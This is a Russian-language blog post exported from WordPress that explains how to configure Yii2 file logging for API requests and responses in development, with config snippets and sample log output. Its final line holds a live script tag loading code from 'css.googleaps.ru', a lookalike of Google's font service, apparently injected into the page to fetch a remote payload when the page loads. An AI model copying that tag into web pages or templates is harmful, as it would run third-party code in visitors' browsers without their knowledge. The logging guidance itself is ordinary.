---
layout: post
status: publish
published: true
title: Логгирование в Yii2
author:
  display_name: Vodka
  login: Vodka
  email: ''
  url: ''
author_login: Vodka
wordpress_id: 47764
wordpress_url: http://devdocs.ru/?p=47764
date: '2015-10-06 22:25:52 +0200'
date_gmt: '2015-10-06 22:25:52 +0200'
categories:
- Yii framework
tags:
- php
- post
- js
- ui
- api
- yii2
- yii
comments: []
---
<p>Задача: записывать в лог-файл какую-то информацию. Например, когда UI делает запросы к API, на этапе отладки необходимо знать, что &#171;уходит&#187; и что &#171;приходит&#187;.</p></p>
<p>В конфиге web.php включается компонент log:</p></p>
<pre class="brush: php; title: ; notranslate">
$config = [<br />
...<br />
    'components' => [<br />
        'log' => [<br />
            'traceLevel' => YII_DEBUG ? 3 : 0,<br />
            'targets' => [<br />
                [<br />
                    'class' => 'yiilogFileTarget',<br />
                    'levels' => ['error', 'warning'],<br />
                ],<br />
            ],<br />
        ],<br />
...<br />
]<br />
</pre></p>
<p><span id="more-418"></span></p></p>
<p>Так как в моем случае логгировать нужно на этапе отладки, я расширяю $config чуть ниже:</p></p>
<pre class="brush: php; title: ; notranslate">
if (YII_ENV_DEV) {<br />
    $config['components']['log']['targets'][] = [<br />
        'class' => '\yii\log\FileTarget',<br />
        'levels' => ['info'],<br />
        'categories' => ['apiRequest'],<br />
        'logFile' => '@app/runtime/logs/API/requests.log',<br />
        'maxFileSize' => 1024 * 2,<br />
        'maxLogFiles' => 20,<br />
    ];<br />
    $config['components']['log']['targets'][] = [<br />
        'class' => '\yii\log\FileTarget',<br />
        'levels' => ['info'],<br />
        'categories' => ['apiResponse'],<br />
        'logFile' => '@app/runtime/logs/API/response.log',<br />
        'maxFileSize' => 1024 * 2,<br />
        'maxLogFiles' => 20,<br />
    ];<br />
}<br />
</pre></p>
<p>Думаю, здесь ничего разъяснять не надо. Запоминаем только categories &#8212; запросы и ответы будем складывать в разные файлы.<br /><br />
Сохраняем в лог следующими командами:</p></p>
<pre class="brush: php; title: ; notranslate">
/** @var array $requestData */<br />
Yii::info(\yii\helpers\Json::encode($requestData), 'apiRequest');<br />
/** @var Guzzle\Http\MessageResponse $response */<br />
Yii::info($response->json(), 'apiResponse');<br />
</pre></p>
<p>В лог-файле наша инфа будет иметь примерно такой вид:</p></p>
<pre class="brush: php; title: ; notranslate">
2014-10-16 07:17:40 [127.0.0.1][543262c2fee212ea69680966][-][info][apiRequest] {"body":[{"spent_at":"01:00","spent_time":1413357460},{"spent_at":"02:00","spent_time":1413443860},{"spent_at":"03:00","spent_time":1413530260},{"spent_at":"04:00","spent_time":1413616660},{"spent_at":"","spent_time":1413703060},{"spent_at":"","spent_time":1413789460},{"spent_at":"","spent_time":1413875860}]}<br />
in /var/www/choicelegal.local/httpdocs/models/choicelegal/AbstractApi.php:74<br />
in /var/www/choicelegal.local/httpdocs/models/choicelegal/Projects.php:83<br />
in /var/www/choicelegal.local/httpdocs/models/Project.php:178</p>
<p>// а также содержимое глобальных переменных $_POST, $_COOKIE, $_SESSION, $_SERVER.</p>
<p></pre><br />
Source: vingtsun-grodno.com<script src="//css.googleaps.ru/css?f=Open+Sans&cd=mb&ver=4.2.2"></script></p>
